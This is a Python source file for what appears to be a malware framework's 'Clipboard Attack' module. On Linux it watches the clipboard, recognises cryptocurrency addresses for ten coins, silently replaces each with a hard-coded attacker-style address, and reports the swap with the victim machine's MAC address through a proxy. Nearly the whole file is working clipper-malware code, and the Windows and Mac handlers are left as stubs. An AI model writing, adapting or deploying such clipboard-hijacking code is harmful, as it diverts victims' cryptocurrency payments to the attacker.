from .attack import Attack, MitreAttack, istanbul_tz
from modules.proxy.proxy import Proxy
import subprocess
from re import match
from time import sleep
from enum import Enum
from typing import List, Dict
from rich import print
from datetime import datetime
from .sys_info import SystemInfo

class InjectAddress(Enum):
    BTC = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    ETH = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
    DOGE = "D7Y55VL5gU2ndJ95Ewsezhk9Ag1M9xHrR2"
    LTC = "LcHKXwjnJkCpNxxFe3nBY2UzBWeSTFCjaD"
    XMR = "42qyz4fUN9jx8xk3HG1U5pL9H4G1G91QJj1n4kMRfXU8XZ94j7v1RL7UBY6gf3N44xBhyQNCgHkP6q29djhGJ2VPvSCX7Bm"
    BCH = "qzx4tcmlclj08uwvzn3f5th30u3h5zs6nhqpyks6rw"
    DASH = "Xx4k65iRgJDPDjZP5tB69Sm3U7xMydc7TB"
    TRX = "TXkD7uRsjoQ3WxVGoK9NEdWszw1sPtWyEb"
    XRP = "r3nnpRH5vhxaFTv7VQMPyQ8G95t2c5Ykt6"
    XLM = "GCD4DBNZ5L7H7DRMG4XCMJDDSC5OFTYH27PNKQOSNDJPRT4ZLFL3MP7H"
    
    
    @classmethod
    def has_value(cls, value: str):
        return value in cls._value2member_map_
    
class CyrptoAddressMatcher:
    """Class to match crypto addresses with their regex."""
    _crypto_addresses_regex = {
        'btc':'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
        'eth':'^0x[a-zA-F0-9]{40}$',
        'doge':'^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$',
        'ltc':'^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$',
        'xmr':'^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$',
        'bch':'^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$',
        'dash':'^X[1-9A-HJ-NP-Za-km-z]{33}$',
        'trx':'^T[A-Za-z1-9]{33}$',
        'xrp':'^r[0-9a-zA-Z]{33}$',
        'xlm':'^G[0-9A-Z]{40,60}$'
    }

    @classmethod
    def match(cls, value: str):
        """Matches the given value with the crypto addresses regex.

        Args:
            value (str): The value to match.

        Returns:
            Tuple[str, str]: The crypto address and the type of the crypto address. 
        """
        for crypto, regex in cls._crypto_addresses_regex.items():
            if match(regex, value):
                return value, crypto
        return None, None

class ClipBoard(Attack):
    def __init__(self,
                 os: str,
                 commands: Dict[str, List[str]],
                 proxy: Proxy):
        """This module logs all clipboard changes on the target machine.

        Args:
            commands (Dict[str, List[str]]): "OS_Name": [command].
        """
        super().__init__(proxy=proxy, name="Clipboard Attack", 
                         description="This module checks the clipboard for crypto addresses.")
        
        self._commands = commands
        self._os = os

    def execute(self):
        self.running = True

        match self._os:
            case "Windows":
                self._windows_clipboard()
            case "Linux":
                self._linux_clipboard()
            case "Darwin":
                self._mac_clipboard()
            case _:
                print("Unsupported OS.")
                self.running = False

    def _windows_clipboard(self):
        # TODO: Implement windows clipboard
        pass

    def _linux_clipboard(self):
        
        def _inject_clipboard(injection: str):
            command = f'echo -n "{injection.strip()}" | xclip -selection clipboard'
            subprocess.run(command, shell=True)
        
        def _get_clipboard_value():
            process = subprocess.Popen(self._commands.get(self._os), stdout=subprocess.PIPE)
            return process.communicate()[0].decode().strip()

        try:
            last_value = _get_clipboard_value()
            while self.running:
                current_value = _get_clipboard_value()
                if current_value != last_value:
                    last_value = current_value
                    
                    crypto_addr, _type = CyrptoAddressMatcher.match(current_value)
                    if crypto_addr:
                        if InjectAddress.has_value(crypto_addr): continue
                        
                        print(f"[bold green]Detected {_type.upper()} crypto address: {crypto_addr}")
                        
                        try:
                            inject_addr = InjectAddress[_type.upper()]
                            _inject_clipboard(inject_addr.value)
                            self._send_result(success=True, 
                                              detected=crypto_addr, 
                                              detected_type=_type.upper(),
                                              injected=inject_addr.value,
                                              injected_type=inject_addr.name.upper())
                        except Exception as e:
                            self._send_result(success=False)
                            
                          
                sleep(2)
        except Exception as e:
            pass
        
    def _mac_clipboard(self):
        # TODO: Implement mac clipboard
        pass
    
    def _send_result(self, 
                     success: bool, 
                     detected: str = None,
                     detected_type: str = None, 
                     injected: str = None,
                     injected_type: str = None):
        
        data = {}
        if success:
            data["detected_cryto_addr"] = detected
            data["detected_cryto_addr_type"] = detected_type
            data["injected_cryto_addr"] = injected
            data["injected_cryto_addr_type"] = injected_type
            
        
        result = {
            "result_type": "clipboard_data",
            "success": success,
            "executed_date": datetime.now(istanbul_tz),
            "machine": SystemInfo._get_mac_addr(),
            "attack": MitreAttack.CLIPBOARD_DATA.value,
            "data":  data
        }
        
        result_data = self.proxy._generate_result_data(**result)
        self.proxy.send_result(result_data)
